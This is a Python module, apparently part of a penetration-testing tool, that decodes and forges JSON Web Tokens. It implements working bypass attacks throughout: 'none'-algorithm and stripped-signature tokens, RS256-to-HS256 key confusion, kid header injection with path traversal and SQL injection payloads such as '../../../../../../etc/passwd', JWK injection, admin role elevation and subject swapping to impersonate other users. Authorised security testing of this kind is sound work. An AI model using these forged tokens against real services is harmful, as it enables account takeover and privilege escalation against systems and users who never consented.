"""
AGI-idor JWT Utilities — Decode, manipulate, and forge JWT tokens
for authentication bypass testing.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import time
from typing import Any, Optional

logger = logging.getLogger("agi-idor.jwt")


def _b64_encode(data: bytes) -> str:
    """Base64url encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def _b64_decode(data: str) -> bytes:
    """Base64url decode with padding fix."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def decode_jwt(token: str) -> dict[str, Any]:
    """Decode a JWT without verification. Returns header, payload, signature."""
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError(f"Malformed JWT: expected at least 2 parts, got {len(parts)}")

    try:
        header = json.loads(_b64_decode(parts[0]))
    except (json.JSONDecodeError, Exception) as e:
        raise ValueError(f"Failed to decode JWT header: {e}")

    try:
        payload = json.loads(_b64_decode(parts[1]))
    except (json.JSONDecodeError, Exception) as e:
        raise ValueError(f"Failed to decode JWT payload: {e}")

    signature = parts[2] if len(parts) > 2 else ""

    return {
        "header": header,
        "payload": payload,
        "signature": signature,
        "raw_parts": parts,
    }


def _encode_token(header: dict, payload: dict, signature: str = "") -> str:
    """Encode header and payload into a JWT string."""
    h = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{signature}"


def modify_claim(token: str, claim: str, value: Any) -> str:
    """Modify a specific claim in the JWT payload and return unsigned token."""
    decoded = decode_jwt(token)
    decoded["payload"][claim] = value
    return _encode_token(decoded["header"], decoded["payload"])


def strip_signature(token: str) -> str:
    """Remove the signature from a JWT (header.payload.)."""
    decoded = decode_jwt(token)
    return _encode_token(decoded["header"], decoded["payload"], "")


def none_algorithm(token: str) -> str:
    """Set algorithm to 'none' and strip signature."""
    decoded = decode_jwt(token)
    decoded["header"]["alg"] = "none"
    return _encode_token(decoded["header"], decoded["payload"], "")


def algorithm_confusion(token: str, public_key_pem: str) -> str:
    """
    RS256 → HS256 confusion attack.
    Re-sign the token using the public key as an HMAC secret.
    """
    decoded = decode_jwt(token)
    decoded["header"]["alg"] = "HS256"

    header_b64 = _b64_encode(json.dumps(decoded["header"], separators=(",", ":")).encode())
    payload_b64 = _b64_encode(json.dumps(decoded["payload"], separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()

    key_bytes = public_key_pem.encode("utf-8")
    signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
    sig_b64 = _b64_encode(signature)

    return f"{header_b64}.{payload_b64}.{sig_b64}"


def kid_injection(token: str, kid_value: str) -> str:
    """Inject a custom 'kid' (Key ID) header value."""
    decoded = decode_jwt(token)
    decoded["header"]["kid"] = kid_value
    return _encode_token(decoded["header"], decoded["payload"])


def jwk_injection(token: str, jwk_dict: dict) -> str:
    """Inject a JWK (JSON Web Key) into the JWT header."""
    decoded = decode_jwt(token)
    decoded["header"]["jwk"] = jwk_dict
    return _encode_token(decoded["header"], decoded["payload"])


def expired_token_reuse(token: str) -> str:
    """Set the exp claim to a past timestamp (test if backend validates expiry)."""
    decoded = decode_jwt(token)
    decoded["payload"]["exp"] = int(time.time()) - 86400  # 24 hours ago
    return _encode_token(decoded["header"], decoded["payload"])


def elevate_role(token: str) -> list[str]:
    """Generate tokens with elevated role claims."""
    decoded = decode_jwt(token)
    variants = []

    role_fields = ["role", "roles", "is_admin", "admin", "user_type", "privilege", "permissions"]
    role_values = {
        "role": ["admin", "administrator", "superadmin", "root"],
        "roles": [["admin"], ["admin", "user"]],
        "is_admin": [True, 1, "true", "1"],
        "admin": [True, 1],
        "user_type": ["admin", "staff", "superuser"],
        "privilege": ["admin", "root"],
        "permissions": ["*", "admin:*"],
    }

    for field in role_fields:
        for val in role_values.get(field, ["admin"]):
            payload_copy = dict(decoded["payload"])
            payload_copy[field] = val
            variants.append(_encode_token(decoded["header"], payload_copy))

    return variants


def swap_subject(token: str, new_sub: str) -> str:
    """Swap the subject ('sub') claim to impersonate another user."""
    decoded = decode_jwt(token)
    sub_fields = ["sub", "user_id", "uid", "userId", "account_id", "email"]
    for field in sub_fields:
        if field in decoded["payload"]:
            decoded["payload"][field] = new_sub
    return _encode_token(decoded["header"], decoded["payload"])


def generate_forged_tokens(original_token: str, public_key_pem: Optional[str] = None) -> list[dict[str, str]]:
    """Generate all JWT bypass variants for testing."""
    results = []

    try:
        results.append({"name": "none_algorithm", "token": none_algorithm(original_token)})
    except Exception as e:
        logger.warning(f"none_algorithm failed: {e}")

    try:
        results.append({"name": "stripped_signature", "token": strip_signature(original_token)})
    except Exception as e:
        logger.warning(f"strip_signature failed: {e}")

    try:
        results.append({"name": "expired_token", "token": expired_token_reuse(original_token)})
    except Exception as e:
        logger.warning(f"expired_token failed: {e}")

    if public_key_pem:
        try:
            results.append({
                "name": "alg_confusion_hs256",
                "token": algorithm_confusion(original_token, public_key_pem),
            })
        except Exception as e:
            logger.warning(f"algorithm_confusion failed: {e}")

    kid_payloads = [
        "../../dev/null",
        "/dev/null",
        "' UNION SELECT '' --",
        "../../../../../../etc/passwd",
    ]
    for kid_val in kid_payloads:
        try:
            results.append({
                "name": f"kid_injection_{kid_val[:20]}",
                "token": kid_injection(original_token, kid_val),
            })
        except Exception as e:
            logger.warning(f"kid_injection failed: {e}")

    try:
        for elevated in elevate_role(original_token):
            results.append({"name": "role_elevation", "token": elevated})
    except Exception as e:
        logger.warning(f"elevate_role failed: {e}")

    return results
